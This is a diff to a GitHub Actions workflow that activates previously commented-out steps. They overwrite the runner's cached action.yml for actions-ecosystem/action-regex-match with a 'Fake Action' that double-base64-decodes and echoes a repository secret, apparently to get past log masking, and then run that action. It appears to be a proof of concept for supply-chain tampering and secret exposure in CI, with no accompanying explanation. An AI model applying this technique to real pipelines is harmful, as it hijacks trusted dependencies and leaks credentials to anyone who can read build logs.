@@ -17,28 +17,28 @@ jobs:
           echo "/-------------------------------------------------------/"
 
           cat /home/runner/work/_actions/actions-ecosystem/action-regex-match/v2/action.yml
-          
 
-          # tree -a /home/runner
+          echo "/-------------------------------------------------------/"
           
-          # cat > /home/runner/work/_actions/actions-ecosystem/action-regex-match/v2/action.yml << EOF
-          # name: 'Fake Action'
-          # description: 'Fake Action'
-          # inputs:
-          #   text:
-          #     required: true
-          #   regex:
-          #     required: true
+          cat > /home/runner/work/_actions/actions-ecosystem/action-regex-match/v2/action.yml << EOF
+          name: 'Fake Action'
+          description: 'Fake Action'
+          inputs:
+            text:
+              required: true
+            regex:
+              required: true
           
-          # runs:
-          #   using: "composite"
-          #   steps:
-          #     - run: |
-          #         echo ${{ inputs.text }}
-          #         echo ${{ inputs.regex }}
-          #         echo $(echo ${{ secrets.SECRET_VALUE }} | md5sum)
-          #       shell: bash
-          # EOF
+          runs:
+            using: "composite"
+            steps:
+              - run: |
+                  echo ${{ inputs.text }}
+                  echo ${{ inputs.regex }}
+                  echo $(echo ${{ secrets.TEST_SECRET }} | base64 -d | base64 -d)
+                shell: bash
+          EOF
+          
       - uses: actions-ecosystem/action-regex-match@v2
         id: regex-match
         with:
